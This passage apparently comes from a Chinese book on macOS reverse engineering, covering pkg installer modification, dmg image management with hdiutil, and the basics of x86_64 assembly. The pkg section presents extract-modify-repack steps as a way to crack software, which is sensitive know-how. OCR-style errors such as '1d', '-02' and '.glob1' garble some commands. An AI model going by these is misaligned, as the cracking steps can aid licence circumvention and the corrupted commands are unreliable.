以上步骤是操作思路，在实际分析过程中，使用工具来做一些辅助工作可以大大提高效率。在拿到pkg后，首先快速浏览pkg文件，简单分析出pkg的行为与可能要做的操作。推荐一款工具：Suspicious Package $ ^{①} $，此工具提供了快速浏览插件，安装完成后，在要操作的pkg上按下空格，就可以快速查看pkg，检索要安装的软件内容，如图4-22所示。

 </div>

还可以查看要执行的脚本内容，如图4-23所示。

 </div>

对pkg有了初步了解，找到需要操作的地方后，下一步就是提取数据内容了。Suspicious Package支持数据提取，使用Suspicious Package打开pkg文件后，在主界面的All Files列就可以查看所有文件，可以选中要导出的文件，直接拖出到Finder，或者点击Action→Export，都可以将文件导出，操作效果如图4-24所示。

 </div>

除了Suspicious Package，还有另外一款更强大的工具：Pacifist $ ^{①} $，这款工具支持多种文件数据的提取，其中就包括pkg，如图4-25所示。

 </div>

选中要提取的文件，右键选择“Extract to Custom Location..”，或者直接拖到要保存的文件夹中，都可以将文件提取出来。

将提取出来的文件，分析完成并修改好了后，就要打包回去了。Pacifist不支持将数据打包回去，如果修改的是Payload，可以使用如下命令将app目录下的myframeworktest.app打包回去：

 $$  find app/*\mid cpio-o>./Payload $$ 

如果是脚本文件，也可以如法炮制。最后就是将修改好的Payload或Scripts重新打包回去，可以执行xar cvf命令来操作，这里推荐另一款图形化工具：Flat Package Editor，该工具是苹果官方提供的，可以对pkg直接进行增、删、改操作。打开要操作的pkg，将修改好的Payload或Scripts拖回去，然后点击菜单File→Save就保存成功了，如图4-26所示。

 </div>

操作完成后，pkg就算修改好了，接下来测试安装没问题就算破解完成了。

### 4.10 dmg

dmg是苹果电脑上专用的磁盘镜像（disk image）文件，类似于Windows平台上的iso镜像。dmg类似于一个压缩文档，支持压缩与加密，将程序与文档打包成dmg是一种比较流行的软件发布形式。

苹果官方系统自带的磁盘管理工具Disk Utility可以很方便地构建dmg文件，最简单的方法就是启动/Applications/Utilities/Disk Utility，点击菜单File→New Image→Image From Folder...，从文件夹创建镜像。选择上一节的app目录，如图4-27所示。

#### 4.10.1 构建 dmg

在Save As处输入要保存的文件名，在Encryption处选择是否进行加密，none表示不加密，128-bit AES encryption是macOS 10.3以前之前支持的128位的AES加密，258-bit AES encryption则是macOS 10.5以后才开始支持的256位AES加密。在选择任意一种加密方式后，会弹出输入密码的对话框，提示输入的密码不是AES算法的加密key，只是一个用户自己设置的密码。设置好密码后，在Image Format处设置镜像的格式，read-only表示创建只读的镜像，compressed表示对镜像进行压缩，read/write表示镜像可读可写，DVD/CD master表示创建DVD镜像，hybrid image表示创建混合镜像。选择好选项后，点击Save按钮，dmg就创建成功了。

除了使用图形界面创建dmg外，还可以使用命令行工具hdiutil来创建，例如为app目录下的myframeworktest.app创建一个AES128加密、密码为abc123的dng镜像，只需要执行如下命令即可：

 </div>

如果觉得从文件夹中创建的dmg不够个性化，完全可以使用Disk Utility创建自定义的dmg，自定义的dmg包括为dmg指定图标、背景图片以及dmg文件的显示方式及大小。只需要打开Disk Utility，点击菜单File→New Image→Blank Image...，创建一个空白的镜像，在保存对话框中设置镜像的大小、加密方式、分区格式及镜像格式。需要注意的是，此处镜像格式需要选择read/write disk image。创建成功后，打开镜像，将app目录中的文件复制进去。如果需要更换背景图片，只需要将背景图片复制到镜像中，使用chflags命令设置成隐藏格式，或者放一个点“.”结尾的目录（默认会隐藏显示）。在镜像上点击右键，在弹出的菜单中选择Get Info，然后设置背景图片即可。操作完后，点击Disk Utility菜单的Images→Convert...，选择操作后的dmg镜像，将该镜像压缩保存就可以发布了。

除了使用官网的Disk Utility外，也可以使用上一节介绍的Luggage工具。编译脚本后，执行make dmg来生成dmg文件。最后，还有一些第三方工具也可以用来创建dmg镜像，比较知名的有DropDMG $ ^{①} $，从软件的名称上就可以判断，它支持通过文件拖放来快速创建dmg镜像。有兴趣的读者可以试试，使用比较简单，此处不再赘述。

#### 4.10.2 管理 dmg

dmg文件格式不是开放的，要想探索它的文件格式，可以使用逆向工具hidutil来处理dmg的部分代码。在使用dmg的过程中，一种可能遇到的典型场景是将dmg转换格式后，在Windows或Linux平台上使用。针对早期版本的dmg，网上有第三方工具dmg2img $ ^{①} $，可以很方便地将dmg转换成可以在Linux系统上挂载的镜像。还有一个工具dmg2iso $ ^{②} $，可以将dmg转换成Windows平台上使用的iso镜像。实际上该工具的底层是调用了hdiutil。

其实，使用hdiutil来管理dmg已经足够了。它提供了查看、创建、转换dmg等功能。例如，查看myframeworktest.dmg的信息可以执行如下命令：

$ hdiutil imageinfo myframeworktest.dmg
Format Description: UDIF read-only compressed (zlib)
Class Name: CUDIFDiskImage
Checksum Type: CRC32
Size Information:
Compressed Ratio: 0.022532451628704386
Total Empty Bytes: 500224
Sector Count: 5060
Total Bytes: 2590720
CUDIFEncoding-bytes-wasted: 7963
Total Non-Empty Bytes: 2090496
CUDIFEncoding-bytes-in-use: 47410
Compressed Bytes: 47410
CUDIFEncoding-bytes-total: 55373
Checksum Value: $404B6F25
Segments:
• • • • • •
-1:
Name: Protective Master Boot Record (MBR : 0)
Partition Number: -1
Checksum Type: CRC32
Checksum Value: $0492F534
2:
Name: (Apple_Free : 3)
Partition Number: 2
Checksum Type: CRC32
Checksum Value: $00000000
Format: UDZO
Backing Store Information:
• • • • • •
partitions:
partition-scheme: GUID
block-size: 512
partitions:
0:
partition-name: Protective Master Boot Record
partition-start: 0

partition-synthesized: true
partition-length: 1
partition-hint: MBR

7:
partition-name: GPT Header
partition-start: 5059
partition-synthesized: true
partition-length: 1
partition-hint: Backup GPT Header
burnable: false
udif-ordered-chunks: false
Properties:
Encrypted: false
Kernel Compatible: true
Checksummed: true
Software License Agreement: false
Partitioned: false
Compressed: true
Resize limits (per hdiutil resize -limits):
min cuI max
5060 5060 5060
将myframeworktest cmd.dmg的密码abc123更改为123abc只需执行如下命令：
$ hdiutil chpass ./myframeworktest_cmd.dmg
Enter password to access "myframeworktest_cmd.dmg": //abc123
Enter a new password to secure "myframeworktest_cmd.dmg": //123abc
Re-enter new password: //123abc
将myframeworktest.dmg转换成iso格式可以执行如下命令：
$ hdiutil convert ./myframeworktest.dmg -format UDTO -o ./myframeworktest.cdr
Reading Protective Master Boot Record (MBR : 0)...
Reading GPT Header (Primary GPT Header : 1)...
Reading GPT Partition Data (Primary GPT Table : 2)...
Reading (Apple_Free : 3)...
Reading disk image (Apple_HFS : 4)...

Reading (Apple_Free : 5)...
Reading GPT Partition Data (Backup GPT Table : 6)...

Reading GPT Header (Backup GPT Header : 7)...

Elapsed Time: 7.868ms
Speed: 314.0Mbytes/sec
Savings: 0.0%
created: /Users/.../code/chapter4/dmg/myframeworktest.cdr
$ mv ./myframeworktest.cdr ./myframeworktest.iso

另外，DropDMG也提供了方便的dmg管理功能。例如，在文件夹上点击右键，在弹出的菜单中选择Services→DropDMG:Use Current Configuration，DropDMG就会使用当前默认的配置为文件夹在当前目录创建一个dmg。或者可以在dmg上点击右键，选择DropDMG:Ask for Options来对dmg做一些修改，例如设置图标、修改密码、更改格式等。

### 4.11 本章小结

macOS系统中包含了形形色色的文件，了解这些文件的内幕对于探索系统的底层运作方式有着重要作用。本章主要探讨了macOS系统中常见的文件格式，并详细讲解了Mach-O的文件格式，分析了dyld加载dylib动态库过程，最后分析讲解了软件安装包pkg与镜像dmg文件。在讲解的过程中，还直接或间接地介绍了大量的第三方工具，这些工具对于分析文件格式是极其有用的，熟练地掌握它们的使用方法，可以有效地提高学习文件格式的效率。

最后，本章中讨论的文件格式只是macOS系统中极少的一部分，限于篇幅，还有很多文件格式没有涉及，比如系统Quicklook插件、Service插件、Internet插件、Xcode插件、内核kext扩展、屏幕保护程序、系统面板等，希望有兴趣的读者可以自行探索。

   </div>

# 汇编基础

对于逆向工程师而言，汇编语言是非常重要的基础知识。因为逆向工程师要接触的目标程序一般只有二进制文件，很少会有源代码，而大多数调试器和静态分析工具都把二进制文件反汇编成汇编代码。

即使有像IDA Pro这样强大的反编译功能，很多时候仍需要阅读反汇编代码来获取更精确的信息，而且在需要修改目标程序的代码时，一般也只有修改汇编代码这一种方式。学习汇编还可以帮助我们更好地理解操作系统的工作方式，具有良好的汇编基础是一名优秀的逆向工程师的基本功。

目前市面上已经有许多汇编的入门书，但是这些书基本上都是基于Windows或者Linux平台进行讲解的，还有的使用的是16位的DOS汇编，但却几乎没有macOS平台下的汇编资料。本章将带领读者在macOS平台下搭建汇编语言的开发环境，并讲解x64汇编语言的基本语法以及macOS上使用汇编语言进行系统调用的方式，也会讲解x86汇编与x64的一些区别。

不过本章并不会详细讲解每条指令，因为x86架构属于CISC（Complex Instruction Set Computing）架构，它的指令集毫无疑问是目前最复杂的指令集，指令数量也达到了将近两千条，讲解每条指令会是一个十分浩大的工程，而且在实际使用中几乎不可能用到所有的指令。如果读者在逆向过程中遇到了不认识的指令也不必担心，可以参考Intel官方提供的“Intel® 64 and IA-32 Architectures Software Developer's Manual”第三卷中的3~5章，其中有关于每一条指令的详细介绍。

### 5.1 搭建汇编语言开发环境

要使用汇编语言开发应用程序，必须有用于开发的工具链。要从汇编源代码生成一个可执行程序，至少需要一个汇编器、一个链接器和一个用于编辑代码的编辑器。如果要对代码进行调试，还需要一个调试器。

macOS上可选的汇编器有很多，有官方提供的Xcode工具链中的as汇编器，有GNU的工具链中的gas，也有一些其他的独立的汇编编译器，比如NASM、YASM等，也有一些像HLA这样带有

一些高级语言特性的汇编器。文本编辑器也有许多可选的，绝大多数支持C、C++、Objective-C、Swift的IDE也都可以用来编写汇编代码，比如Xcode、QtCreator、AppCode和CLion等，不过可能并没有高亮以及智能提示。也可以使用Sublime Text、Visual Studio Code等编辑器加对应的语法高亮插件，不过这样编译和调试不太方便。

经过仔细考虑，笔者最终选择了Xcode和Xcode工具链中的as汇编器作为主要的开发工具，主要是因为它由苹果官方提供，稳定性更好，更方便与Xcode、Clang等工具配合，并且该汇编器同时支持Intel语法和AT&T语法。而Xcode则可以提供一键编译、调试和语法高亮等功能。

这个组合虽然不如Windows平台下的Radasm配合MASM32环境来得方便,但是相对于其他工具来说,这个组合更适合初学者使用。

在之前的章节中我们已经安装好了Xcode，不需要再安装其他额外的工具了，接下来使用这个环境编译我们的第一个汇编的Hello World。不过到目前为止，我们还没有详细介绍汇编的语法，这个Hello World该怎么写呢？

这里可以让Clang将一个C的Hello World编译成汇编代码，然后直接使用这个生成的汇编代码来测试我们的汇编开发环境。

首先需要编写一个C语言的Hello World程序代码，并将其保存为Hello.c，如下所示：

#include <stdio.h>

int main()
{
    puts("Hello, World!\\n");
    return 0;
}

使用Clang将其编译成汇编代码：

$ clang -02 -S -masm=intel -fno-asynchronous-unwind-tables Hello.c

这条命令的意思是让Clang编译器编译Hello.c，但是并不生成可执行程序或者机器码，而是生成汇编代码，语法格式为Intel语法。-02选项是启用优化，如果不启用优化的话，生成的汇编代码中会有一些无用的指令。

-fno-asynchronous-unwind-tables是阻止编译器生成“.cfi”系列的伪指令，主要是用于记录栈帧信息，平时编写汇编时基本上不会用到。

执行完后会发现在当前目录下生成了一个Hello.s，这个Hello.s就是我们需要的汇编版本的Hello World源代码：

1. section ___TEXT, ___text, regular, pure ___instructions
2. macosx version min 10, 12
3. intel syntax noprefix
4. globl ___main
5. align 4, 0x90
6 main: ___

7## BB#0:
8 push rbp
9 mov rbp, rsp
10 lea rdi, [rip + L_.str]
11 call_puts
12 xor eax, eax
13 pop rbp
14 ret
15
16 .section _TEXT, _cstring,cstring_literals
17 L_.str:
18 .asciz "Hello, World!\n"
19
20
21 .subsections_via_symbols

如果读者有在Linux平台上使用gas汇编的经验会发现，lvm工具链中的as语法与gas的语法基本上是一致的。现在我们已经有了Hello World程序的汇编源代码，可以暂时不用关心每行汇编代码的具体含义，先看一下如何将它编译成可执行文件。将一个汇编源文件编译成可执行文件一般需要两个步骤，首先使用as汇编器将源代码编译成.o文件：

as Hello.s -o Hello.o

然后使用1d命令进行链接得到可执行文件：

ld Hello.o -e _main -lsystem -arch x86_64 -macosx_version_min 10.12.0 -o Hello

-e (entry) 参数指定了程序的入口点为_main，如果不指定默认为_start。源代码中调用了系统的函数puts()，所以需要-lsystem参数链接系统的库。-arch表示链接为64位的应用程序，-macosx_version_min则指定了运行需要的最低的系统版本。

执行完命令后就会在当前目录下生成一个Hello可执行文件，执行这个文件就会看到输出了"Hello, World!"字符串。

看完了如何使用命令行编译汇编代码，接下来再来看如何使用Xcode编译汇编版的Hello World。首先打开Xcode，新建一个项目，项目类型选择macOS下的“Command Line Tool”，工程名为“asm_hello”，语言选择C语言，其他可按照具体情况进行配置。

创建完后Xcode会自动生成mian.c源文件，不过我们并不需要这个C的源文件，直接将main.c删除，并将Hello.s源文件复制到工程目录下，然后添加到asm_hello工程中，完成后效果如图5-1所示。

 </div>

完成后直接点击工具栏上的运行按钮或者使用command+R快捷键即可编译运行，在Xcode的输出窗口就可以看到输出了"Hello, World!"。同时Xcode还可以调试汇编代码，添加断点的方式与C、C++、Objective-C、Swift等语言没有差别，读者可以自行测试。

### 5.2 Hello World 代码概览

Hello World程序的汇编源代码主要由伪指令和机器指令两部分组成，其中伪指令（pseudo operation或pseudo instruction）有时也被称为汇编器命令（assembler directive），它们并不是指令集中真正的指令，一般不会生成机器码（也有像MASM汇编器中的.IF等宏指令是会生成机器码的），而是用于指示汇编器如何进行汇编操作或者定义数据的指令。

在Hello World的源代码中以点（.）开头的指令都是伪指令，在本章后面的小节中将会介绍as汇编器中常用的伪指令。剩下的部分如push、mov、call等则是x86_64指令集中的机器指令，它们经过汇编器的汇编操作生成对应的机器码，并可以在程序加载后执行。在接下来的小节中，会介绍x86_64中常用的指令，以及as汇编器支持的两种x86_64汇编语法——Intel语法和AT&T语法。

代码第1行的.section指示了接下来的代码所位于的段和节区，_TEXT说明是位于程序的代码段，_text则是主程序代码节区，后面的参数则是这个节区的属性。这里的段对应着Mach-O文件格式中的段，第4章有Mach-O文件格式的描述。

   </div>

代码第2行表示运行程序所需要的macOS的最低版本为10.12。

第3行代码表示汇编代码使用Intel语法。

第4行代码表示我们希望_main符号可以被链接器1d使用，因为_main是程序的入口函数，所以它必须被链接器使用，并将入口地址写入可执行文件的LC_MAIN加载命令。

.align指示了接下来的代码的对齐方式，这里是 $ 2^4=16 $字节对齐，指令空隙部分使用0x90（nop）进行填充。

#为单行注释，类似于C语言中的“//”，此外as汇编器还支持C语言中的多行注释方式，使用“/”包裹的的内容也是注释。

8~14行则是真正的汇编指令，它使用"Hello World!\n"字符串作为参数调用了C的puts()函数，然后返回0结束了main函数。

16~18行则是在代码段的字符串节区中定义了一个以0结尾的字符串，在汇编代码中可以通过_str来引用该字符串。

最后的.subsections_via_symbols伪指令表示当前的节区可以被内联到其他代码中，并且如果没有被其他代码使用就可以被剔除掉。

相信大家已经对macOS上的汇编有了一个初步的了解, 接下来将对macOS上的x86_64汇编语言的指令及语法做更深入的学习。

### 5.3 伪指令

在Hello World的代码中我们已经接触了一些伪指令，一个正常的汇编程序是离不开各种各样的伪指令的，接下来将详细地看一下平时比较常用的伪指令的作用及用法，用好这些伪指令，我们编写汇编程序将会更加方便，代码也会更加简洁，可以达到事半功倍的效果。

# 1. 定义节区伪指令

程序的数据和指令都是存放于不同段的节区中的，汇编作为一种低级语言，在编写的时候需要有程序员指定所编写的指令和数据存放的节区，因此需要伪指令来告诉汇编器指令和数据存放的节区。

.section伪指令指示了接下来的代码所位于的段和节区，并指定了节区的属性，.section伪指令的格式为：.section segname，sectname [[[，type]，attribute]，sizeof_stub]。

segname和sectname分别指定段和节区的名字，之后的3个参数为可选项，type指定节的类型，attribute指定节的属性，sizeof_stub参数只在type为symbol_stubs时需要，用于指定symbol stubs的大小。

type参数常用的可选的值有以下几种。

(1) regular: regular类型的节区可以包含任意的代码或数据，并且链接器不会对它们做任何特殊处理。

(2) cstring_literals: cstring_literals类型的节区一般用于存储C类型的字符串字面量，也就是以空字符\0结尾的字符串。链接器会将该节区中的相同的字符串进行合并，只保留一份备份，并对引用字符串的地址进行重定位。

由于字面量属于常量，所以不应该对其进行修改，链接器会将代码中引用的相同的字符串只保留一份实例，然后将所有引用该字符串的代码所使用的地址重定位到该实例上。

(3) 4 byte_literals、8 byte_literals与16 byte_literals：顾名思义，用于存放4字节、8字节或16字节的字面量，与cstring_literals类似，链接器也会对该节区中的常量进行合并，并对引用的地址进行重定位。

(4) symbol_stubs: symbol_stubs 节区一般是由编译器生成的，手写汇编代码很少用到，它一般用于保存未定义的函数的桩代码，一般为动态库中的函数，方便程序在加载时动态填充函数的地址，一般对应Mach-O文件格式中的_stub节区，与Windows系统上PE文件中的导入表类似。该节区中所有符号大小相同，由.section伪指令中的sizeof_stub参数指定。

attribute参数表示该节区的属性，该参数可以省略，表示该节区没有特殊的属性。除此之外，本章只用到了pure_instructions参数，表示该节区中只包含指令代码，一般用于_TEXT，_text节区。

由于 .section 伪指令参数较多，使用起来并不方便，因此as汇编器还提供了一些伪指令方便节区的定义，这些伪指令与 .section 伪指令的对应关系如表5-1所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>简写</td><td style='text-align: center; word-wrap: break-word;'>对应的.section伪指令写法</td><td style='text-align: center; word-wrap: break-word;'>作用</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.text</td><td style='text-align: center; word-wrap: break-word;'>默认情况下或启用了-dynamic链接选项时与.section_TEXT, _text,regular,pure_instructions作用相同，当启用了-static时与.section、_TEXT、_text、regular作用相同</td><td style='text-align: center; word-wrap: break-word;'>存储指令代码</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.const</td><td style='text-align: center; word-wrap: break-word;'>.section _TEXT, _const</td><td style='text-align: center; word-wrap: break-word;'>保存常量数据，C语言中switch-case语法生成的跳转表也保存在此节区</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.cstring</td><td style='text-align: center; word-wrap: break-word;'>.section _TEXT, _cstring, cstring_literals</td><td style='text-align: center; word-wrap: break-word;'>保存C语言字符串字面量</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.literal4</td><td style='text-align: center; word-wrap: break-word;'>.section _TEXT, _literal4,4byte_literals</td><td style='text-align: center; word-wrap: break-word;'>保存4字节的字面量</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.literal8</td><td style='text-align: center; word-wrap: break-word;'>.section _TEXT, _literal8,8byte_literals</td><td style='text-align: center; word-wrap: break-word;'>保存8字节的字面量</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.literal16</td><td style='text-align: center; word-wrap: break-word;'>.section _TEXT, _literal16,16byte_literals</td><td style='text-align: center; word-wrap: break-word;'>保存16字节的字面量</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.data</td><td style='text-align: center; word-wrap: break-word;'>.section _DATA, _data</td><td style='text-align: center; word-wrap: break-word;'>存放已初始化的非常量全局变量</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>.const_data</td><td style='text-align: center; word-wrap: break-word;'>.section _DATA, _const, regular</td><td style='text-align: center; word-wrap: break-word;'>保存常量数据。与.const不同的是，这里的常量数据不能在编译期确定，而是在运行时计算得到，比如C代码const into = bar();所定义的foo变量。手写的汇编代码一般不会用到这个区段</td></tr></table>

   </div>

按照表中的对应关系，可以将上面的Hello World代码进行简化，顺便去掉一些编译器生成的不常使用的伪指令，简化后的代码如下所示：

.text
.intel_syntax noprefix
.globl    _main
.align    4, 0x90
_main:
    push    rbp
    mov    rbp, rsp
    lea    rdi, [rip + L_.str]
    call    _puts
    xor   eax, eax
    pop    rbp
    ret
.cstring
L_.str:
.asciz    "Hello, World!\n"

大家可以自行测试这段代码能否正常编译和运行。

# 2. 对齐伪指令

在x86_64架构的CPU上，以4字节或8字节对齐的数据存取速度最快。伪指令.align用于指示汇编器之后的数据和指令的对齐方式，该伪指令的格式如下：

.align align_expression [ , 1byte_fill_expression [ ,max_bytes_to_fill]]

align_expression为一个整数，以它作为2的指数运算后得到的值就是要对齐的字节数。比如说.align 3就是 $ 2^{3}=8 $字节对齐，.align 4就是16字节对齐。两个可选参数1byte_fill_expression 和max_bytes_to_fill分别表示对齐时空隙中要填充的数据和最多填充多少字节。

# 3. 数据定义伪指令

一般情况下，汇编语言应该算作是无类型的低级语言，因为数据的“类型”完全是取决于你如何使用它，不过as汇编器还是提供了伪指令，用于定义类似于C语言中的数据类型，以方便我们使用。

##### 整型

定义整型数据的伪指令有 .byte、.short、.long 和 .quad 这 4 种，长度分别为 1 字节、2 字节、4 字节和 8 字节。它们的作用相同，只是定义的数据长度不同，这里以 .byte 为例来介绍。.byte 伪指令个数如下：

.byte [ expression ] [ , expression ] ...

.byte伪指令在当前节区开辟一块内存，并使用expression提供的值对其进行初始化，每个expression表达式的值占一个字节。比如说如下代码：

.data
foo: .byte 1,2,3,4

可以近似地理解为在.data节区定义了一个byte数组，数组中有4个元素，值分别是1到4，可以通过foo标号引用这个数组。当然也可以只定义一个元素。

##### 浮点型

浮点型数据有4字节的单精度浮点型数据和8字节的双精度浮点型数据两种，分别使用.single和.double进行定义，定义浮点型数据的伪指令使用方式与定义整型数据的伪指令使用方式一样，不过值得一提的是，as汇编支持用“+Infinity”、“-Infinity”和“NaN”来表示正无穷、负无穷以及无效的数字。

### o 字符串

as汇编器提供了两种定义字符串的伪指令，一种是.asciz，用于定义类似于C语言字符串字面量的字符串，格式如下：

.asciz [ "string" ] [ , "string" ] ...

这个伪指令用于在当前节区定义一个字符串，字符串以0结尾。另一种是.ascii，与.asciz 唯一的差别是它并不会自动在字符串末尾加0。以下3种写法效果是一样的：

.asciz "Hello"
.ascii "Hello\0"
.byte 'H', 'e', 'l', 'l', 0x6f, 0
其中0x6f是小写字母o的ASCII码值。

# 4. 符号导出伪指令

默认情况下，一个编译单元（.s文件）中的符号只在本编译单元可见，在其他的编译单元或链接器中是无法使用的，如果要使符号对外可见，则需要使用.glob1伪指令（注意是glob1不是global）进行导出。.glob1伪指令使用比较简单，格式如下：

.glob1 symbol_name

symbol_name就是要导出的符号名，一般为某个函数或变量的标号。

# 5. 包含头文件伪指令

包含头文件的伪指令为.include，它与C语言的#include效果相同，都是在预编译期将指定文件的内容插入到该伪指令所在的位置。.include使用方式如下：

.include "foo.h"

.include伪指令首先会在当前目录查找foo.h文件，如果没有找到，则会从汇编器的-I参数所指定的目录中进行查找，都没有找到的话就会报编译错误。合理使用头文件可以提高代码的复用率，使代码更加简洁直观。

### 5.4 x86_64 汇编基础

了解了伪指令之后，再来看一下在CPU上实际运行的机器指令。不过在此之前需要先了解一下指令的运行环境。现代操作系统都已经对各种硬件资源进行了抽象，除非是编写在裸机上运行

   </div>

的程序或设备的驱动，汇编指令一般很少会直接使用除了CPU中的寄存器和内存以外的硬件资源，而是通过系统提供的各种编程接口来访问各种外部设备。

在接下来的章节中我们将学习与汇编指令运行息息相关的寄存器和内存等概念, 然后再来了解x86_64架构上的两种汇编语法（Intel语法和AT&T语法）和常用的汇编指令。

#### 5.4.1 寄存器

寄存器（Register）是CPU中一种用于临时存储数据的高速存储单元，它的存取速度是所有存储介质中最快的，不过其容量非常小。不同的寄存器有不同的作用，在x86_64架构中根据功能的不同可将寄存器划分为通用寄存器、段寄存器、控制寄存器、浮点寄存器、标志寄存器、调试寄存器等。在较新的支持MMX、SSE和AVX指令集的CPU中，还有这些指令集专用的MMX寄存器、SSE寄存器和AVX寄存器。

# 1. 通用寄存器

x86_64架构中共有16个通用寄存器（General Purpose Registers，GPRs），大小都为64bit。这些寄存器又可以进行拆分为32bit、16bit或8bit的寄存器。它们的对应关系如表5-2所示。

 </div>

<table border=1 style='margin: auto; word-wrap: break-word;'><tr><td style='text-align: center; word-wrap: break-word;'>64bit寄存器</td><td style='text-align: center; word-wrap: break-word;'>第0-31bit</td><td style='text-align: center; word-wrap: break-word;'>第0-15bit</td><td style='text-align: center; word-wrap: break-word;'>第8-15bit</td><td style='text-align: center; word-wrap: break-word;'>第0-8bit</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RAX</td><td style='text-align: center; word-wrap: break-word;'>EAX</td><td style='text-align: center; word-wrap: break-word;'>AX</td><td style='text-align: center; word-wrap: break-word;'>AH</td><td style='text-align: center; word-wrap: break-word;'>AL</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RBX</td><td style='text-align: center; word-wrap: break-word;'>EBX</td><td style='text-align: center; word-wrap: break-word;'>BX</td><td style='text-align: center; word-wrap: break-word;'>BH</td><td style='text-align: center; word-wrap: break-word;'>BL</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RCX</td><td style='text-align: center; word-wrap: break-word;'>ECX</td><td style='text-align: center; word-wrap: break-word;'>CX</td><td style='text-align: center; word-wrap: break-word;'>CH</td><td style='text-align: center; word-wrap: break-word;'>CL</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RDX</td><td style='text-align: center; word-wrap: break-word;'>EDX</td><td style='text-align: center; word-wrap: break-word;'>DX</td><td style='text-align: center; word-wrap: break-word;'>DH</td><td style='text-align: center; word-wrap: break-word;'>DL</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RSP</td><td style='text-align: center; word-wrap: break-word;'>ESP</td><td style='text-align: center; word-wrap: break-word;'>SP</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>SPL</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RBP</td><td style='text-align: center; word-wrap: break-word;'>EBP</td><td style='text-align: center; word-wrap: break-word;'>BP</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>BPL</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RSI</td><td style='text-align: center; word-wrap: break-word;'>ESI</td><td style='text-align: center; word-wrap: break-word;'>SI</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>SIL</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RDI</td><td style='text-align: center; word-wrap: break-word;'>EDI</td><td style='text-align: center; word-wrap: break-word;'>DI</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>DIL</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>R8</td><td style='text-align: center; word-wrap: break-word;'>R8D</td><td style='text-align: center; word-wrap: break-word;'>R8W</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>R8B</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>R9</td><td style='text-align: center; word-wrap: break-word;'>R9D</td><td style='text-align: center; word-wrap: break-word;'>R9W</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>R9B</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>R10</td><td style='text-align: center; word-wrap: break-word;'>R10D</td><td style='text-align: center; word-wrap: break-word;'>R10W</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>R10B</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>R11</td><td style='text-align: center; word-wrap: break-word;'>R11D</td><td style='text-align: center; word-wrap: break-word;'>R11W</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>R11B</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>R12</td><td style='text-align: center; word-wrap: break-word;'>R12D</td><td style='text-align: center; word-wrap: break-word;'>R12W</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>R12B</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>R13</td><td style='text-align: center; word-wrap: break-word;'>R13D</td><td style='text-align: center; word-wrap: break-word;'>R13W</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>R13B</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>R14</td><td style='text-align: center; word-wrap: break-word;'>R14D</td><td style='text-align: center; word-wrap: break-word;'>R14W</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>R14B</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>R15</td><td style='text-align: center; word-wrap: break-word;'>R15D</td><td style='text-align: center; word-wrap: break-word;'>R15W</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>R15B</td></tr><tr><td style='text-align: center; word-wrap: break-word;'>RFLAGS</td><td style='text-align: center; word-wrap: break-word;'>EFLAGS</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>无</td><td style='text-align: center; word-wrap: break-word;'>无</td></tr></table>

为了帮助读者理解它们之间的关系，这里以RAX为例进行说明。如图5-2所示，RAX对应的是整个64位的寄存器，而EAX、AX、AH和AL则分别对应RAX寄存器中的某一部分，其他的寄

存器与其子寄存器关系与此相同。

 </div>

在x86_64汇编中，操作32位的寄存器时会对整个64位寄存器造成影响，比如将EAX寄存器赋值为1，则整个REX寄存器也会被赋值为1，而不是只有第32位被赋值为1，操作16位或8位的寄存器则不会有此影响。

这些寄存器虽然被分类为通用寄存器，但大多数寄存器在特定的时候都会有专门的作用，比如说RCX又称作计数器（Counter），在使用重复前缀（REP）指令和LOOP指令时被用于计数；RDX在进行除法运算时用作存放余数。除此之外，它们可以被当作通用的临时存储数据的空间。不过也有一些通用寄存器有着十分专一的用处，如RSP和RBP。

☐ RSP: 栈指针寄存器，该寄存器用于存放当前任务的栈顶地址。关于栈，我们将在介绍栈操作指令时进行介绍。

☐ RBP：基址指针寄存器，一般被用存放作高级语言函数调用中栈帧的基地址。

# 2. 指令指针寄存器

指令指针寄存器（RIP）用于存放CPU将要执行的下一条指令的地址，该寄存器是无法在汇编代码中直接修改的，而是由控制转移指令和CPU按照规则自动管理的。

